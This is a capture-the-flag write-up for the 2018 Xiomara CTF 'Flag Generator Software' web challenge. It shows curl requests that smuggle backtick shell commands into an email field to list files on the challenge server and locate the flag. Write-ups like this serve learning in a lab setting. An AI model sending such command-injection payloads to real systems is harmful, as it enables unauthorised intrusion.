# Reference

[//]: <> (文章所涉及到的技术点、WriteUp的链接)

* https://www.pwndiary.com/write-ups/xiomara-ctf-2018-flag-generator-software-write-up-web100/
* http://happynote3966.hatenadiary.com/entry/2018/02/28/111943

# Title

[//]: <> (题目)

xiomara doesn’t generate flag anymore. Can you get one?

http://103.5.112.91:5000/

# Content

[//]: <> (WriteUp内容)


Let’s see what’s on the page.

```php
$ curl http://103.5.112.91:5000
<!DOCTYPE HTML>
 
<html>
	<head>
		<title>Xiomara Flag Software</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
		<link rel="stylesheet" href="assets/css/main.css" />
		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
		<!--[if lte IE 9]><link rel="stylesheet" href="assets/css/ie9.css" /><![endif]-->
	</head>
	<body>
 
		<!-- Header -->
			<header id="header">
				<h1>Xiomara Flag Generator Software</h1>
				<p>Sorry we currently closed our service. We do not sell flag anymore. Farewell!!<br />
				</p>
<br><br>
 
          <p>You can subscribe to our newsletter below.</p>
			</header>
 
		<!-- Signup Form -->
			<form  method="post" action="email.php">
				<input type="email" name="email" id="email" placeholder="Email Address" />
				<input type="submit" value="Subscribe" />
			</form>
 
		<!-- Footer -->
			
				<ul class="copyright">
					<li>&copy; Xiomera.</li></li>
				</ul>
			</footer>
 
		<!-- Scripts -->
			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
			<!--<script src="assets/js/main.js"></script>-->
 
	</body>
</html>
```

So, we have a subscription form which posts our email to the email.php for newsletter subscription. Let’s submit an email address to see how it works.

```
$$ curl http://103.5.112.91:5000/email.php -d 'email=dummy@mail.com'
Thankyou for subscribing! Your email id is dummy@mail.com
```

It prints back a thank you message which includes our email, interesting. I tried to inject some <script> code as email address but got empty string as response. Then, I decided to try code injection using ` operator.

```
curl http://103.5.112.91:5000/email.php -d 'email=`ls`'
Thankyou for subscribing! Your email id is assets email.php flag images index.html
```

We got a directory listing! Let’s investigate further.
```
$ curl http://103.5.112.91:5000/email.php -d 'email=`file flag`'
Thankyou for subscribing! Your email id is flag: directory
$ curl http://103.5.112.91:5000/email.php -d 'email=`ls flag`'
Thankyou for subscribing! Your email id is generator.c generator.xiomara
```

We have generator.c and generator.xiomara under flag directory. Let’s download and look at the source code.

```
$ wget http://103.5.112.91:5000/flag/generator.c
$ cat generator.c
//This file is not for challenge
 
//Never upload this file in challenge server
 
//Thank you!
 
#include<stdio.h>
void flag()
{
char *p2 = "xiomara{command_injections_are_bad}";
}
void main()
{
flag();
}
```

We found the flag xiomara{command_injections_are_bad}.